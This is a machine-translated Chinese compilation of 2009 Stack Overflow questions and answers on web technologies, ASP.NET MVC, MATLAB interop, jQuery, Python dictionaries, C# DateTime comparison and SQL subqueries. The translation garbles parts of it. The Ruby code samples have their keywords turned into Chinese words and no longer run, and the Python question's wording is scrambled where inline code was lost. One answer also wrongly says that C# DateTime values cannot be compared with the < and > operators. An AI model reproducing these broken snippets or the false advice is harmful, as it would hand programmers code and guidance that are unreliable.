未来几年，最重要的事情似乎将是移动市场。一些移动设备可以运行闪存，但由于支持和性能不佳，它并没有被太多使用。移动网络可以工作的唯一方法是使用基于标准的纯解决方案，因为这确实是唯一可以信任存在的基线。

无论出现什么专有技术，我始终可以信赖这样一个事实，即我的 XHTML 页面仍然可以在决定访问它的任何设备上成功呈现。对于闪光灯或银光来说，情况并非如此。

同时，我也可以向您保证，闪光灯和 Silverlight 将会有更大的市场，因为网络在一些利基市场（YouTube、Adobe Air、Hulu、Google Gears 等）变得更加“媒体丰富”。几个例子）。它绝对会有市场，但我不会说它会打败 XHTML 和 web 标准，因为 web 不断被重新定义。

无论 Flash 或 Silverlight 尝试了多少，该技术都会发展得如此之快，以至于我认为唯一保留的基准将是 XHTML 和 CSS 之类的标准。

Flash 已经存在多年，但仍未接管。我认为这是替换 XHTML 有多难的一个很好的例子。

进行任何类型的服务器端开发，但我不会成为 Silverlight 或 Flash 专家。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T03:19:27.157

**<水晶球模式>**

老实说，我看不到它发生。除了 tvanfosson 和 DanHerbert 提到的原因之外，XHTML + CSS + JS 堆栈刚刚变得足够成熟，以至于 AJAX 和 jQuery 之类的东西通过这些工具使几乎所有轻量级客户端的东西变得容易（与流视频、繁重的计算或套接字等）

共同的技术惯性只会保证现有的东西会留下来。人们更有可能使用已经存在了一段时间并经过扩展以满足最新要求的东西，而不是使用全新的东西。当然，时不时地会有很大的范式转换，比如从本机代码到托管代码的转换，但我认为 Flash 或 Silverlight 不会发生这种情况。

**</水晶球模式>**

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T03:59:36.140

我希望所有这一切都会产生一个新的标准化 Web 平台，真正适合构建人们希望使用开发人员真正想要使用的工具看到的 Web 应用程序。我看到所有的努力都试图将这些传统的 Web 技术硬塞进“Web 2.0”模型中，我只是希望这种努力能够用于打造真正具有革命性的“Web v.Next”。

不要误会我的意思，我真的很喜欢 jQuery 为使 Javascript 客户端代码更容易所做的工作，但它仍然是 Javascript，我个人的偏好是使用具有高效开发工具的强类型语言。

同时，我认为 Silverlight 和 Flash 之类的工具可以提供很多东西，并且在某些情况下可以帮助您比其他 Web 技术更轻松地完成工作，而有些事情您根本无法以其他任何方式完成。但我不认为 Silverlight 或 Flash 或任何其他技术是最终目标，只是朝着正确方向迈出的一步。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-12T19:15:48.380

我当然希望如此。是的，我认为他们会的。出于重新调整的目的，旧版 (XHTML/CSS/JS) 应用程序将会进行一些开发，但我认为总有一天，新应用程序根本不会在这些平台上创建。

手机是现在的问题。Flash 在许多主要手机型号上不可用。他们的浏览器无处不在。幸运的是，有 Webkit（iPhone 和 G1）。

如果 Silverlight 成为 Web 平台，那么它将成为当前使用的大杂烩技术的一个不错的可行替代方案。仅供参考，Microsfoft 说 Android 上的 Silverlight 是非常有可能的。在 iPhone 上，很难说，Apple 对这些事情很奇怪。

AOL 最近在 Silverlight 中创建了它的电子邮件客户端的 RIA 版本。看起来不错，无需担心 Javascript 错误。从开发人员的角度来看，这是巨大的。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-12T03:11:55.893

考虑一下，您可以使用 Javascript、(X)HTML 和 CSS 在功能上大量重叠来操作网页，但所有这三种技术今天仍然在突出使用。原因是这三种语言都是不同的工具，旨在解决不同的问题，没有一种语言可以充分替代另一种语言。

Flash / Silverlight 与这些现有的 Web 技术是一样的。事实上，我在一家开发基于 Flash 的电子学习的开发商店工作。我们目前的产品之一最初是为使用纯基于 Flash 的导航解决方案等而构建的。但是，随着产品的不断发展，我们实际上已经将许多功能从基于 Flash 的电子学习模块转移到了常规的 html 页面。

换句话说，我认为我们不会很快放弃 Web 开发人员使用的当前工具。在大多数情况下，我将 Flash / Silverlight 视为附加工具，可以比我们以前解决的问题更好地解决特定问题。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-12T03:13:56.590

任何一方都不会很快获胜。我预计使用哪一个将完全取决于未来许多年的目的。

您最近看到如此多的 Silverlight 工作机会的原因是因为它是一项相对较新的技术，并且最近才获得了一些动力。

不过，我确实希望 Silverlight 能够快速使用 Flash。

# asp.net-mvc - MVC 模型：向视图提交多个对象

> ID：434312
> 
> 赞同：0
> 
> 时间：2009-01-12T03:02:44.210
> 
> 标签：asp.net-mvc

我不确定这两种方法是否有区别。如果是这样，当向视图提交多个对象时，这将被认为是更好的做法。

1.  让控制器对每个对象模型的数据层进行单独调用，然后将对象包装在模型中以发送到视图。

2.  定义一个“展示”模型并让控制器调用该单个模型以发送到视图。

3.  其他...？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T03:06:29.820

您应该发送给`View`单个对象，有时称为`ViewModel`对象，其中包含视图需要的所有数据（包括域模型对象）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-12T03:20:16.767

我在这里假设您有一个视图，它显示了来自多个模型的一些信息，可能以列表格式。例如，您可能有一个具有一组联系人的客户模型，但在您的列表中，您希望选择显示一些客户详细信息以及主要联系人的姓名和电话号码。在这种情况下，我通常会定义一个特定的“演示”模型，该模型仅包含我可能希望在此组合视图中显示的那些细节。它通常是只读模型。使用 LINQ to SQL，我什至可以将其定义为表值函数（以支持搜索）并将其与封装各种表连接的视图相关联。两者都可以添加基于视图的“演示文稿”

我更喜欢这样做，因为我相信在查询方面在服务器上构建查询并简单地从代码中使用它会更有效。如果您没有使用表值函数进行搜索，则可以在代码中构造查询并选择“表示”类。为了便于在视图中使用，我更倾向于使用实际类而不是匿名类型。从视图中的匿名类型获取属性会很困难。

# c# - Matlab和C#之间的互操作

> ID：434331
> 
> 赞同：19
> 
> 时间：2009-01-12T03:11:16.033
> 
> 标签：c#, .net, matlab, interop, matlab-deployment

在互联网上窥视之后，似乎可以在 C# 和 Matlab 之间进行互操作。我想知道是否有人在这方面取得了成功，以及他们为此做了什么。如果可能的话，在不使用 COM 的情况下以某种方式将其拉下来。谢谢你的时间。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-01-12T14:55:28.000

从 MATLAB 的 R2009a 版本开始，可以从 MATLAB 访问 .NET 对象：

[http://www.mathworks.com/help/techdoc/matlab_external/brpb5k6.html](http://www.mathworks.com/help/techdoc/matlab_external/brpb5k6.html)

在旧版本的 MATLAB 中，可以使用 CCW 从 MATLAB 访问 .NET 对象：

[http://www.mathworks.com/support/solutions/data/1-5U8HND.html?solution=1-5U8HND](http://www.mathworks.com/support/solutions/data/1-5U8HND.html?solution=1-5U8HND)

和 .NET 的 MATLAB 引擎：

[http://www.mathworks.com/access/helpdesk/help/techdoc/index.html?/access/helpdesk/help/techdoc/matlab_external/f135590.html#f135616](http://www.mathworks.com/access/helpdesk/help/techdoc/index.html?/access/helpdesk/help/techdoc/matlab_external/f135590.html#f135616)

您还可以使用 MATLAB Builder NE 将 m 代码包装到 .NET 程序集中。

[http://www.mathworks.com/products/netbuilder/](http://www.mathworks.com/products/netbuilder/)

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2009-01-12T03:25:56.100

是的，很有可能。虽然我最终使用了 C 接口并使用混合模式 DLL 调用它（并让 C# 调用它......但那是因为我也在与其他一些 C 代码交互）。这很简单。在要运行程序的计算机上，您需要安装 Matlab Runtime MCRInstaller.exe。

编辑：删除断开的链接

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-01-12T15:10:09.220

是的，我设法做到了，而且几乎没有痛苦。

您必须为 .NET 编译 MATLAB 代码（如以前的答案中所述），运行 MCR 安装程序，在 .NET 项目中引用 MWArray.dll 和编译后的代码 dll，然后离开。

唯一的烦恼是接口强制你的转换（有时是多个转换！）（在转换运算符中使用显式）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-07-28T18:29:15.540

Matlab 有一个免费和开源的 .NET 包装器，非常简单： http: [//www.codeproject.com/KB/dotnet/matlabeng.aspx](http://www.codeproject.com/KB/dotnet/matlabeng.aspx)

我用这个。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-12T03:29:41.880

如果你愿意花钱，这可能是你需要的：

[http://www.mathworks.com/products/netbuilder/](http://www.mathworks.com/products/netbuilder/)

它可以为 Matlab 代码生成包装器，允许从 .NET 和 COM 调用它。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-21T20:34:35.943

在 R2009a 预发行版中，您可以从 MATLAB 调用 .net 程序集。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-02-01T06:44:08.503

我不确定这对您有多大影响，但请尝试查看 matlab 可执行文件或[MEX](http://www.mathworks.com/support/tech-notes/1600/1605.html)基本上，用 C 或 FORTRAN 编写程序真的很容易，包括一些库和函数，然后您可以使用 C 或 FORTRAN 函数在matlab中

# jquery - 从 Flickr 加载图像时如何显示微调器？

> ID：434336
> 
> 赞同：0
> 
> 时间：2009-01-12T03:12:52.163
> 
> 标签：jquery, ajax, flickr

我正在使用[jquery.flickr-1.0.js](http://www.projectatomic.com/2008/04/jquery-flickr/)在我的应用程序中搜索 flickr 中的图像。我面临的问题是，有时 flickr 需要几秒钟来响应结果，我想加载一个旋转的 gif 来代替我的搜索按钮“btnRefresh”，直到返回结果。我怎样才能做到这一点？

```
jQuery(function(){   
    jQuery(".btnRefresh").livequery('click', function(){
        var number = $(this).attr("id");
        $('#gallery_flickr_'+number+'').show();
        jQuery('#gallery_flickr_'+number+'').html("").flickr({      
            api_key: "XXXXXXXXXXXXXXXXXXXX",     
            per_page: 18,
            search_text: $('input#flickr_search_'+number+'').val(),
            id: $(this).attr("id")
        });
    }); 
}); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-01-12T03:25:53.883

flickr 插件在其选项中支持回调属性。因此，您可以在调用 flickr 之前显示微调器，然后在回调中隐藏它。

```
jQuery(function(){   
    jQuery(".btnRefresh").livequery('click', function(){
        $("#spinner").show();

        var number = $(this).attr("id");
        $('#gallery_flickr_'+number+'').show();
        jQuery('#gallery_flickr_'+number+'').html("").flickr({      
            api_key: "XXXXXXXXXXXXXXXXXXXX",     
            per_page: 18,
            search_text: $('input#flickr_search_'+number+'').val(),
            id: $(this).attr("id"),
            callback: function() {
                $("#spinner").hide();
            }
        });
    }); 
}); 
```

应该这样做...假设您的页面中有一些称为微调器的东西，默认情况下是隐藏的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T03:43:21.133

**首先**- 去这里创建一个旋转的 gif 或 png - [http://ajaxload.info/](http://ajaxload.info/)

**第二**- 将微调器保存在图像目录中 - ./images/ajax-loader.gif

**第三**- 将一个 div 添加到您的 html 中，微调器将位于页面上，比方说

```
<div id="spinner"></div> 
```

**第四**- 在现有代码中添加两行。

```
jQuery(function(){   
    jQuery(".btnRefresh").livequery('click', function(){
      var number = $(this).attr("id");
      $('#gallery_flickr_'+number+'').show();
      $("div#spinner").html("<img src='./images/ajax-loader.gif'>");
        jQuery('#gallery_flickr_'+number+'').html("").flickr({      
            api_key: "XXXXXXXXXXXXXXXXXXXX",     
            per_page: 18,
            search_text: $('input#flickr_search_'+number+'').val(),
            id: $(this).attr("id")
        });
      $("div#spinner").html(" ");
    }); 
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-12T03:22:54.107

我不熟悉您在上面引用的 flickr() 方法，但通常处理这类事情的方法是在调用之前显示 gif，然后在调用完成时将其隐藏。上面的代码看起来不是异步的，所以我的方法是在 btnRefresh 旁边放一个 gif，id 为“imgLoading”。使第一行类似于 $('imgRefresh').hide(); 在您的点击处理程序中，将函数包装在

```
$('.imgLoading').show(); $('.btnRefresh').hide(); 
```

和

```
$('.imgRefresh').hide(); $('.btnRefresh').show(); 
```

这不是最复杂的方法，但你知道...保持简单之类的东西。

问题是，如果它不是异步的，你会怎么处理超时？刷新按钮可能永远隐藏。您可能会考虑设置一个计时器以确保向用户呈现可用状态（如果您想花哨的话，一条消息表明脚本似乎正在超时）。

# baml - BAML 混淆

> ID：434339
> 
> 赞同：2
> 
> 时间：2009-01-12T03:14:30.177
> 
> 标签：baml

是否有任何工具/商业混淆器可以混淆 WPF 控件中的 BAML 资源？如果不是这样，那么在 IP 保护方面将是一段艰难的时期，因为黑客可以通过使用 BAML 到 XAML 转换器轻松地窥探 BAML 资源。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T15:39:21.337

[Eazfuscator.NET执行智能 XAML 混淆，包括仔细处理最复杂的绑定表达式等。您可以](http://www.gapotchenko.com/eazfuscator.net)[在此处](http://eazfuscator.blogspot.com/2012/10/xaml-renaming-for-wpf.html)阅读有关它的更多信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T04:36:12.150

这就是 .NET 的问题所在：Claytons Open Source——当你不做开源时你做的开源。

这个主题已经在网络上的其他地方访问过：

*   [保护我的知识产权/XAML](http://dotnet.org.za/rudi/archive/2008/06/17/protecting-my-intellectual-property-xaml.aspx)
*   [WPF 应用程序的代码保护和许可。](http://social.msdn.microsoft.com/forums/en-US/wpf/thread/038a0c6e-3c5d-4497-b678-2fa9317b524f/)
*   [.net 混淆器 {smartassembly}](http://www.smartassembly.com/)

后者看起来很有希望。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2010-04-17T00:30:18.837

我知道您写问题已经有一段时间了，但我想告诉您，现在可以对 XAML 和 BAML 代码进行混淆。

在 Creatix，我们今天发布了 CodeFort 的 1.0 版本，这是一种混淆工具，它能够混淆 .NET、WPF 和 Silverlight 程序集，甚至可以重命名 XAML 和 BAML 代码中的标识符。这使得 100% 混淆 WPF 或 Silverlight 应用程序的类型和成员成为可能。

您可以在以下位置了解有关混淆器的更多信息并下载 CodeFort 免费软件版本： http: [//www.codefort.org](http://www.codefort.org)

最好的问候，克里斯蒂安

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2010-10-11T11:30:13.027

[Crypto Obfuscator](http://www.ssware.com/cryptoobfuscator/obfuscator-net.htm)混淆 XAML（在 Silverlight 程序集中）以及 BAML（在 WPF 程序集中） - 它重命名 XAML/BAML 文件中的类/成员引用。此外，它还会去除这些文件中的所有注释、换行符和空格，将它们变成人眼看到的垃圾。

# c# - .Net C# 正则表达式用于解析 URL 参数

> ID：434347
> 
> 赞同：0
> 
> 时间：2009-01-12T03:19:04.833
> 
> 标签：c#, regex

我需要解析一个字符串，比如 **/a/b/c/d=uno/c=duo.html**

分为三组，例如

*   **/a/b/c/**
*   **d=uno/**
*   **c=duo.html**

解析规则如下：

1.  第一组是“d=”之前的所有内容，如果“d=”不是字符串的一部分，则为整个字符串。
2.  第二组是“c=”之前的所有内容，或者如果“c=”不是字符串的一部分，则为第一组之后的字符串的其余部分。
3.  第三组匹配第二组之后的其余字符串。

我对以下正则表达式 (?.+/)?(?d=([^/]+)/)?(?c=(?.*)) 的问题是我不知道如何停止该组它遇到“d =”。

任何帮助将不胜感激。

谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-12T03:23:46.087

您需要以您提供的形式解析的字符串，还是带有参数的实际 URL？如果是 URL，您可以使用[System.Web.HttpUtility.ParseQueryString](http://msdn.microsoft.com/en-us/library/system.web.httputility.parsequerystring.aspx)提取包含每个参数及其值的 NameValueCollection。

我发现这甚至在 Windows 窗体中也很有用（例如，在 ClickOnce 部署的应用程序中解析查询参数）。

# python - 在 Python 中比较字典

> ID：434353
> 
> 赞同：5
> 
> 时间：2009-01-12T03:23:17.990
> 
> 标签：python, dictionary

给定两个字典，`d1`and`d2`和一个 integer `l`，我想找到这样的`k`所有键or 。我想输出 中的键和对应的值，除非如果不包含键，我想打印 0。例如，如果是`d1``d2[k]<l``k not in l``d2``d2``d1`

```
a: 1
b: 1
c: 1
d: 1 
```

并且`d2`是

```
a: 90
b: 89
x: 45
d: 90 
```

并且`l`是 90，输出将是（可能以不同的顺序）

```
b 89
c 0 
```

在 Python 中执行此操作的最佳方法是什么？我刚刚开始学习这门语言，到目前为止，这就是我所拥有的：

```
for k in d1.keys():
    if k not in d2:
        print k, 0
    else:
        if d2[k]<l:
            print k, d2[k] 
```

这当然有效（除非我有错字），但在我看来，会有一种更 Pythonic 的方式来做这件事。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-01-12T03:50:58.217

您的实际上很好-您可以将其简化为

```
for k in d1:
    if d2.get(k, 0) < l:
       print k, d2.get(k, 0) 
```

这（对我来说）是pythonic，几乎是直接“翻译”成您描述的代码。

如果你想避免双重查找，你可以这样做

```
for k in d1:
    val = d2.get(k, 0)
    if val < l:
        print k, val 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-12T03:43:45.547

您可以通过使用 defaultdict 来简化此操作。在 defaultdict 上调用 __getitem__ 将返回“默认”值。

```
from collections import defaultdict
d = defaultdict(int)
print d['this key does not exist'] # will print 0 
```

您可以更改的另一点是不调用键。字典实现了**iter**。最好简单地写：

```
for k in d1: 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-12T04:15:41.053

这是一个紧凑的版本，但你的完全没问题：

```
from collections import defaultdict

d1 = {'a': 1, 'b': 1, 'c': 1, 'd': 1}
d2 = {'a': 90, 'b': 89, 'x': 45, 'd': 90}
l = 90

# The default (==0) is a substitute for the condition "not in d2"
# As daniel suggested, it would be better if d2 itself was a defaultdict
d3 = defaultdict(int, d2)
print [ (k, d3[k]) for k in d1 if d3[k] < l ] 
```

输出：

```
[('c', 0), ('b', 89)] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-09-24T06:06:00.850

你的已经足够好了，但这里有一个更简单的：

```
for k in d1:
    val = d2.get(k, 0)

    if val < l:
        print k, val 
```

# javascript - 对象使用与 Javascript/JSON 类似的语言

> ID：434359
> 
> 赞同：2
> 
> 时间：2009-01-12T03:25:39.517
> 
> 标签：javascript, json

我最近一直在做一个项目，专注于一个几乎完全由客户驱动的网站。显然 Javascript 被大量使用，而且我一直在使用 jQuery，结果证明使用它是一种绝对的乐趣。

令我惊讶的一件事是我非常喜欢 JSON 对象语法，并且它在 javascript 中使用（由 jQuery 突出显示，它在任何地方都使用它）。对于那些不熟悉它的人，请考虑这个简短的示例：

```
function add(params) {
    params.result(params.a, params.b);
}

add({
    a: 1,
    b: 2,
    result: function(value) {
        alert(value);
    }
}); 
```

当然，这个例子非常做作，但它说明了基本用法。JSON 动态描述一个对象，在这种情况下作为参数传递给函数，甚至在其中定义一个函数以用作回调。我个人发现这种方法非常易于使用、理解和生成 API（尽管我知道有些人会不同意我的观点。）

所以我的问题是，这种语法是 javascript 独有的吗？我知道许多语言都有 JSON 解析器（并且已经使用了几个），但它们不允许这种内联声明。当然，你可以用这种语法做的大部分事情都可以通过各种语言中的命名参数和 lambda 表达式或函数指针（我想起 Python）来复制，但我仍然觉得这不那么优雅。

只是好奇，感谢您的任何回复！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T04:53:55.813

典型的例子是 Lisp：在 Lisp 中，语言甚至不是根据文本定义的，而是根据数据结构定义的。代码和数据之间确实没有区别：代码只是一个列表，其第一个元素被解释为操作，其余元素被解释为操作数。

编写程序只是编写列表。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T04:58:39.657

Lua 使用与 javascript 对象几乎相同的“表”。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-05-16T23:17:48.383

JSON 的语法与 Perl 对复杂结构的定义非常相似。你的例子是：

```
#!/usr/bin/perl

use strict;
use warnings;
use signatures;
sub add($hash) {
    $hash->{result}($hash->{a}, $hash->{b});
}

add({
    a=> 1,
    b=> 2,
    result=> sub ($val) {
        print "$val\n";
    }
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-01-12T03:31:50.813

C# 3.0 有一些相似之处，您既可以使用默认构造函数实例化对象，也可以在同一语句中分配属性。它实际上只是一点语法糖，但它确实比声明多个构造函数来处理参数设置的各种组合要容易得多。看起来像：

```
 var myObject = new MyClass { Property1 = "value", NumericProperty = 1 }; 
```

C# 3.0 中也有一些匿名类型，它们具有类似的语法。这些经常与 LINQ 一起使用

```
 var query = dataContext.Entity
                        .Where( e => e.Kind = 1 )
                        .Select( e => new { e.Name, e.Kind } ); 
```

这会产生一个新的匿名类型的 IEnumerable，它具有属性“Name”和“Kind”，而这些属性又具有与相应实体属性相同的类型。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-12T04:53:29.387

Rubists 会这样做：

```
定义添加（参数）{
    params.result(params.a, params.b)
}

add({:a=> 1, :b=> 2}) 做 |值|
    警报（值）
结尾

```

可选块的传递在 ruby​​ 中是一种奇怪的习语。或者更忠实于你的例子。

```
定义添加（参数）{
    params.result(params.a, params.b)
}

添加（{
    :a=> 1,
    :b=> 2,
    :result=> proc 做 |value|
        警报（值）
    结尾
})

```

但内联函数的概念源于 lambda 演算和 LISP。

# c# - 我有一个条件，使用 < 运算符比较 C# 中的 DateTime，即使它不应该返回，它也会返回 false。为什么？

> ID：434367
> 
> 赞同：2
> 
> 时间：2009-01-12T03:33:36.753
> 
> 标签：c#

我在下面有这段代码，即使数据库中的日期时间大于 datetimenow，“if ((DateTime)DataReader[0] > DateTime.Now)”条件也会返回 false。

我以前使用过这段代码，它可以正常工作，我从来没有改变过任何东西。

所以问题是为什么条件返回假？

谢谢，

西蒙

```
Boolean active = false;
SqlConnectionUniqueInstance.Instance.Open();
SqlCommand Command = SqlConnectionUniqueInstance.Instance.Connection.CreateCommand();
Command.CommandText = String.Format(@"SELECT [LogoutDateTime] FROM [dbo].[sessions] WHERE [sessionID] = {0}", sessionId.ToString());
SqlDataReader DataReader = Command.ExecuteReader();
while (DataReader.Read())
{

    if ((DateTime)DataReader[0] > DateTime.Now)
        active = true;
}
DataReader.Close();
if (active)
    UpdateTime(sessionId);
Command.Dispose();
return active; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-04T20:56:35.613

这是实际的答案：

您不需要/拥有/不应该将 DateTime 与 >、<、== 或 != 运算符进行比较。相反，您可以使用 DateTime 类的 Compare 和 CompareTo 方法。

[Compare](http://msdn.microsoft.com/en-us/library/system.datetime.compare.aspx)：比较两个 DateTime 实例并返回一个整数，指示第一个实例是早于、相同还是晚于第二个实例。

[CompareTo](http://msdn.microsoft.com/en-us/library/system.datetime.compareto.aspx)：重载。将此实例的值与指定的 DateTime 值进行比较，并指示此实例是早于、相同还是晚于指定的 DateTime 值。

[http://msdn.microsoft.com/en-us/library/system.datetime_members.aspx](http://msdn.microsoft.com/en-us/library/system.datetime_members.aspx)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T04:15:10.493

首先，以这种方式使用 DateTime 是一种不好的做法。您应该将 DateTime.ToUniversalTime 的值存储在数据库中，并使用 DateTime.ToLocalTime 方法将加载的 DateTime 转换为本地时间。也不清楚有多少记录将从数据库返回，即您可以多次重写活动。只需向我们展示 (DateTime)DataReader[0] 和 DateTime.Now 的值（包括 DateTime.Kind 属性）

程序逻辑也看起来晦涩难懂 - 为什么注销时间在未来？

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-01-12T03:37:19.163

我建议有一个变量并使用它与 DateTime.Now 进行比较

```
 while (DataReader.Read())
{
    // or use DateTime.Parse instead here
    DateTime dbDate = (DateTime)DataReader[0];
    if (dbDate > DateTime.Now)
        active = true;
} 

```

这将有助于更轻松地调试并帮助您阅读 DataReader 返回的内容。
在旁注中，我猜测数据库包含空值。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-12T03:40:19.860

我要做的第一件事是打印两个时间值，这样我就可以确切地看到正在发生的事情。正如 aku 在评论中提到的，检查时区差异。

**编辑**：逻辑有意义吗？

```
if ((DateTime)DataReader[0] > DateTime.Now) 
```

日期/时间是注销时间吗？所以这是检查“如果注销时间在将来，那么......” - 还是我完全误读了这个？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-01-12T04:06:35.253

我猜，

这可能与那个 while 循环有关，您是否正在查看数据库中 sessionID 匹配的所有记录？

为什么 sessionID 不是主键？

如果是，为什么是while循环？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-01-12T04:12:15.350

嗯....您如何获得比现在更大的“LogoutDateTime”？你有没有花时间知道你的用户什么时候*退出*？

如果您的数据库字段中有一个默认值（例如 1/1/1990），那么这将解释您的问题。在他们注销之前，该字段或该字段都应该为空，您应该测试是否为空。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-01-13T18:04:25.827

LogoutDateTime 是会话的到期时间。所以我检查的是会话是否过期。

sessionID 是主键，所以 where 子句不能返回超过 1 个结果。

为什么我要使用一段时间？因为这是我知道使用 SqlDataReader 的方式。有更好的办法吗？请赐教。

表创建脚本：

```
CREATE TABLE [dbo].[Sessions](
    [SessionID] [int] IDENTITY(1,1) NOT NULL,
    [UserId] [int] NOT NULL,
    [LoginDateTime] [datetime2](7) NOT NULL,
    [LogoutDateTime] [datetime2](7) NOT NULL,
    [Culture] [nvarchar](5) NOT NULL
) ON [PRIMARY] 
```

与日志相同的方法：

```
 public static Boolean GetActive(Int32 sessionId)
    {
        Boolean active = false;
        SqlConnectionUniqueInstance.Instance.Open();
        SqlCommand Command = SqlConnectionUniqueInstance.Instance.Connection.CreateCommand();
        Command.CommandText = String.Format(@"SELECT [LogoutDateTime] FROM [dbo].[sessions] WHERE [sessionID] = {0}", sessionId.ToString());
        SqlDataReader DataReader = Command.ExecuteReader();
        while (DataReader.Read())
        {
            System.IO.File.AppendAllText("C:\\Log.txt", "DataBase Time    :" + ((DateTime)DataReader[0]).ToString() + " Kind:" + ((DateTime)DataReader[0]).Kind.ToString() + "\r\n");
            System.IO.File.AppendAllText("C:\\Log.txt", "DateTime.Now Time:" + DateTime.Now.ToString() + " Kind:" + DateTime.Now.Kind.ToString() + "\r\n");

            if ((DateTime)DataReader[0] > DateTime.Now)
                active = true;
            System.IO.File.AppendAllText("C:\\Log.txt", "active:" + active.ToString() + "\r\n");
        }
        DataReader.Close();
        if (active)
            UpdateTime(sessionId);
        Command.Dispose();
        return active;
    } 
```

日志：

数据库时间：2009-01-13 01:32:28 种类：未指定

DateTime.Now 时间：2009-01-13 01:02:31 种类：本地

活动：假

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-02-05T12:56:53.160

您的示例代码将 DateTimes 与不同的 DateTimeKind 进行比较。尝试将它们转换为相同的类型，例如 UTC。这篇[博](http://blog.hackedbrain.com/archive/2006/06/01/5173.aspx)文解释了比较中不同 DateTimeKind 的缺陷。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2009-01-12T03:53:35.137

谢谢大家，我确实设置了一个变量来比较，没有任何改变。我还比较了蜱虫，但没有用。当我减去刻度时，它向我确认数据库中的日期更大。

# java - Java中的单调增加时间？

> ID：434369
> 
> 赞同：21
> 
> 时间：2009-01-12T03:34:08.547
> 
> 标签：java, time

在 Java 应用程序中，我希望能够在操作开始时获取时间戳，并能够定期检查操作已经运行了多长时间。问题是：我不想受到网络时间协议移动时钟、管理员更改时间或任何可以突然调整时间的影响。我想要一个单调递增的时间值。我相信这排除了 java.util.Date、Time 和 Calendar。

JRE 中是否存在一些单调递增时间戳的来源？

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2009-01-12T03:55:35.603

您是否考虑过使用[System.nanoTime()](http://java.sun.com/j2se/1.5.0/docs/api/java/lang/System.html#nanoTime())？

它仅在计算两个事件之间经过的时间时才有意义。由于文档声明它与任何系统或挂起时间无关，我相信它可以在您的情况下使用。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-01-12T04:00:45.263

[JodaTime](http://joda-time.sourceforge.net/)有一个类可以做到这一点。它被称为[持续时间](http://joda-time.sourceforge.net/key_duration.html)。

> “它们没有年表或时区，仅包含毫秒持续时间。”

您也可以将日期戳设置为格林威治时间，网络时间协议应该不是问题。

# mysql - 另一个 SQL 教程问题：Field > 0？

> ID：434374
> 
> 赞同：2
> 
> 时间：2009-01-12T03:40:11.873
> 
> 标签：mysql, sql, select

好吧，[这个](http://sqlzoo.net/1a.htm)（3a；提供答案的示例问题）让我摸不着头脑：

> **英国广播公司（名称、地区、地区、人口、国内生产总值）**
> *3a。找出每个地区最大的国家：*

```
SELECT region, name, population
  FROM bbc x
 WHERE population >= ALL
    (SELECT population
       FROM bbc y
      WHERE y.region = x.region
        AND population > 0) 
```

`WHERE y.region = x.region`当我考虑到 db 引擎循环遍历表条目并将每个 x.region 与当前 y.region （在嵌套 SELECT 中）匹配时，我理解 ' ' 的概念......但是 wtf 确实 ' `AND population > 0`' 做? 没有它，这不是一个正确的答案，但我不明白怎么不...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T03:48:43.603

我在这里推测。

如果某个特定区域的所有记录的人口都为空怎么办？

编辑：忽略人口中的 -ve 值（不是现实生活场景）可以被认为是一种安全网。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-12T03:50:01.417

该子句之所以存在，是因为 Europe 表（针对梵蒂冈）中有一个条目，其在 population 列中为 NULL。以下也有效，我相信更容易理解：

```
SELECT region, name, population
  FROM bbc x
 WHERE population >= ALL
    (SELECT population
       FROM bbc y
      WHERE y.region = x.region
        AND population IS NOT NULL) 
```

在[ALL subqueries 的 MySQL 文档中](http://dev.mysql.com/doc/refman/5.0/en/all-subqueries.html)，有一个有用的评论（强调他们的）：

> 通常，*包含**NULL**值*的表和*空表*是“极端情况”。在编写子查询代码时，请始终考虑是否考虑了这两种可能性。

# database - 存储唯一 URL Slug 的最佳方式是什么？

> ID：434376
> 
> 赞同：7
> 
> 时间：2009-01-12T03:40:55.833
> 
> 标签：database, url, slug

我正在尝试为我的网站生成一些[url 'slugs'](http://codex.wordpress.org/Glossary#S)。它基于一段用户生成的文本。

